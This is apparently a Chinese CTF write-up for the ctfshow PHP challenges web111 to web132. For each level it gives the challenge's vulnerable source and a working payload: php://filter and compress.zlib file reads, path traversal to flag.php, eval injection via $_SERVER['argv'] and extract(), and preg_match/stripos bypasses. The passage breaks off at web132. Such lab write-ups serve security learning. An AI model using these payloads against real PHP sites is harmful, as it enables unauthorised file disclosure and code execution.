invoke__">preg_match</span>(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">getFlag</span>(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>$GLOBALS — 引用全局作用域中可用的全部变量，var_dump可以输出数组<br>
一个包含了全部变量的全局组合数组。变量的名字就是数组的键。</p>
<p>ctfshow{eb655091-d6da-49ac-9cb2-720ddfd96409}</p>
<h1>web112</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\.\.\/|http|https|data|input|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php</p>
<p>?file=php://filter/resource=flag.php</p>
<p>?file=php://filter/read=convert.quoted-printable-encode/resource=flag.php</p>
<p>?file=compress.zlib://flag.php</p>
<p>ctfshow{d02647e2-a740-41a6-9655-e216a80a09f6}</p>
<h1>web113</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/filter|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>?file=compress.zlib://flag.php</p>
<p>ctfshow{fc4adad6-e67a-4a2f-acc6-182981fd2038}</p>
<h1>web114</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;师傅们居然tql都是非预期 哼！&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(! <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>?file=php://filter/resource=flag.php</p>
<p>ctfshow{d99300ad-d9f6-42a3-b591-dcb9fdb4c81c}</p>
<h1>web115</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$num</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;e&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;+&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$num</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$num</span>) <span class="keyword">and</span> <span class="variable">$num</span>!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">trim</span>(<span class="variable">$num</span>)!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">filter</span>(<span class="variable">$num</span>)==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hacker!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!!!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编写程序查看哪些东西可以用</p>
<p>首先是is_numeric()</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt;<span class="number">128</span> ; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="variable">$x</span>=<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>).<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">   <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$x</span>)==<span class="literal">true</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>再看trim+is_numeric</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt;=<span class="number">128</span> ; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="variable">$x</span>=<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>).<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">   <span class="keyword">if</span>(<span class="title function_ invoke__">trim</span>(<span class="variable">$x</span>)!==<span class="string">&#x27;1&#x27;</span> &amp;&amp;  <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面这是自己测试的过程</p>
<p>通常下面的url编码不会被过滤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">空格：%20</span><br><span class="line">换行符：%0a</span><br><span class="line">制表符：%09</span><br><span class="line">回车符：%0d</span><br><span class="line">垂直制表符：%0b</span><br></pre></td></tr></table></figure>
<p>?num=%0c36</p>
<p>ctfshow{d868739b-d912-4a86-b673-7350f9de5640}</p>
<h1>web123</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?/&quot;</span>, <span class="variable">$c</span>)&amp;&amp;<span class="variable">$c</span>&lt;=<span class="number">18</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);  </span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在php中变量名字是由数字字母和下划线组成的，所以不论用post还是get传入变量名的时候都将空格、+、点、[转换为下划线，但是用一个特性是可以绕过的，就是当[提前出现后，后面的点就不会再被转义了。<a href="https://developer.aliyun.com/article/1585258?spm=a2c6h.12873639.article-detail.9.734c76b6RS9rI3">https://developer.aliyun.com/article/1585258?spm=a2c6h.12873639.article-detail.9.734c76b6RS9rI3</a></p>
<p>这里CTF[SHOW.COM=&gt;CTF_SHOW.COM</p>
<p>要求CTF_SHOW、CTF_SHOW.COM必须传参，fl0g不能传参。所以$fl0g===&quot;flag_give_me&quot;条件不能满足，可以利用上面的eval。</p>
<p>psot=CTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=echo $flag</p>
<p>ctfshow{c1a29324-df3e-4f88-aaaa-07fca79f4668}</p>
<p>题中有一段代码是a=a=_SERVER[‘argv’];</p>
<p>pear文件包含，argv这个东西涉及到了pear文件包含的原理。</p>
<p>具体请点击上文的链接，接下来是个人理解</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">argv能够独立获取传入?=巴拉巴拉...的作用</span><br><span class="line">$_SERVER[‘argv’][0] = $_SERVER[‘QUERY_STRING’]这个就是获取传入?的</span><br><span class="line">$_SERVER[‘argv’][0]就是a[0]</span><br><span class="line"></span><br><span class="line">那么我们在上面的方法当中没有传入fl0g=flag_give_me</span><br><span class="line">那么我们在这里可以传入$fl0g=flag_give_me，在post里面使用SERVER[′argv′][0](也就是a[0])就可以绕过isset(fl0g)</span><br><span class="line"></span><br><span class="line">payload:注意这里传入的不是fl0g，而是带$的fl0g，通过eval调用$a[0]。eval函数用不了可以使用asset代替</span><br><span class="line">get:</span><br><span class="line">?$fl0g=flag_give_me;</span><br><span class="line">post:</span><br><span class="line">CTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=eval($a[0])</span><br><span class="line"></span><br><span class="line">另外一个payload，利用parse_str()函数，不使用eval，但是这种方法需要bp发包:</span><br><span class="line">$query = &quot;name=John&amp;age=30&amp;city=New York&quot;;</span><br><span class="line">parse_str($query, $output);</span><br><span class="line"></span><br><span class="line">payload:这里我方便理解，就写的和作者一样了，根据个人能力可以联想一下，修改。+是空格</span><br><span class="line">get:</span><br><span class="line">?a=1=1+fl0g=flag_give_me</span><br><span class="line">post:</span><br><span class="line">CTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=parse_str($a[1])</span><br></pre></td></tr></table></figure>
<h1>web125</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i&quot;</span>, <span class="variable">$c</span>)&amp;&amp;<span class="variable">$c</span>&lt;=<span class="number">16</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);</span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>CTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=extract($_POST)&amp;fl0g=flag_give_me</p>
<p>对post进行覆盖，让$fl0g=flag_give_me，以便if($fl0g===“flag_give_me”)可以正常识别到fl0g</p>
<p>或者我们使用上面的办法</p>
<p>get:</p>
<p>?$fl0g=flag_give_me;</p>
<p>post:</p>
<p>CTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=eval($a[0])</p>
<p>再或者</p>
<p>?a=flag.php</p>
<p>CTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=highlight_file($_GET[a])</p>
<p>ctfshow{0605866c-3720-4957-ac25-0e9ff5cc71bd}</p>
<h1>web126</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i&quot;</span>, <span class="variable">$c</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$c</span>)&lt;=<span class="number">16</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);  </span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>get:</p>
<p>?$fl0g=flag_give_me;</p>
<p>psot:</p>
<p>CTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=eval($a[0])</p>
<p>ctfshow{b6aceaa0-bba5-4f52-adce-3439b1a660f1}</p>
<h1>web127</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$ctf_show</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>);</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//特殊字符检测</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\.|\\\|\//&#x27;</span>, <span class="variable">$url</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">waf</span>(<span class="variable">$url</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;嗯哼？&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctf_show</span>===<span class="string">&#x27;ilove36d&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里我们要传入?ctf_show=ilove36d</p>
<p>但是被waf函数过滤了下划线</p>
<p>但我们在之前知道：在php中变量名字是由数字字母和下划线组成的，所以不论用post还是get传入变量名的时候都将空格、+、点、[转换为下划线，但是用一个特性是可以绕过的，就是当[提前出现后，后面的点就不会再被转义了。</p>
<p>那么我们需要绕过对下划线的过滤，而waf当中是没有过滤空格的，所以</p>
<p>?ctf show=ilove36d</p>
<p>ctfshow{1bfb2e20-7d56-40ba-b1ff-8c1289186722}</p>
<h1>web128</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$f1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f1&#x27;</span>];</span><br><span class="line"><span class="variable">$f2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f2&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">check</span>(<span class="variable">$f1</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">call_user_func</span>(<span class="title function_ invoke__">call_user_func</span>(<span class="variable">$f1</span>,<span class="variable">$f2</span>)));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;嗯哼？&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>题目的正则要求f1不存在字母数字，v2无限制。</p>
<p>calluser_func：第一个参数是被调用的回调函数，其余参数是回调函数的参数。</p>
<p>var_dump：打印变量的相关信息</p>
<p>gettext():__<em>()是gettext()的拓展函数 在开启相关设定后，</em>(“666”)等价于gettext(“666”)，且就返回其中的参数</p>
<p>get_defined_vars：返回由所有已定义变量所组成的数组，因为包含了flag.php，所以flag.php里面肯定有$flag储存了flag。</p>
<p>?f1=_&amp;f2=get_defined_vars</p>
<p>var_dump(call_user_func(call_user_func($f1,$f2)));<br>
=&gt; var_dump(call_user_func(call_user_func(_,‘get_defined_vars’)));<br>
=&gt; var_dump(call_user_func(get_defined_vars));</p>
<p>ctfshow{a8ba5b1e-f162-46b1-aa12-bc88b1159f36}</p>
<h1>web129</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">readfile</span>(<span class="variable">$f</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>?f=php://filter/|ctfshow/resource=flag.php</p>
<p>应该是没有过滤器ctfshow，这里就是为了过去stripos()函数</p>
<p>stripos()用于查找一个字符串在另一个字符串中首次出现的位置，忽略大小写。</p>
<p>wp给了好多方法</p>
<p>GET传参：</p>
<p>//查看源码<br>
?f=php://filter/|ctfshow/resource=flag.php<br>
?f=/ctfshow/…/…/…/…/…/…/…/var/www/html/flag.php<br>
?f=./ctfshow/…/flag.php</p>
<p>//直接回显base64<br>
?f=php://filter/read=convert.base64-encode|ctfshow/resource=flag.php</p>
<p>ctfshow{2ac556be-32a9-4647-a0ca-5721ba627b25}</p>
<h1>web130</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="variable">$f</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>) === <span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>preg_match不识别数组，否则返回false</p>
<p>stripos()遇到数组会返回null,null!=false,所以可以绕过stripos函数</p>
<p>post:</p>
<p>f[]=</p>
<p>.表示任意单个字符，+表示必须匹配1次或多次，+?表示 重复1次或更多次，但尽可能少重复。</p>
<p>post:</p>
<p>f=ctfshow</p>
<p>f=ctfshow,即可绕过preg_match函数。同时，if(0 === flase)返回值为false，0不是强等于false的，所以也不满足if(stripos($f, ‘ctfshow’) === FALSE)</p>
<p>ctfshow{a3819496-3fb6-41d5-bf1d-29d4f6dbd81f}</p>
<h1>web131</h1>
<p>需要跑脚本，略</p>
<h1>web132</h1>
<p>需要用dirsearch搜</p>
<p>我这里的代码是：</p>
<p>C:\Users\ssz\AppData\Local\Programs\Python\Python312\dirsearch-master<br>
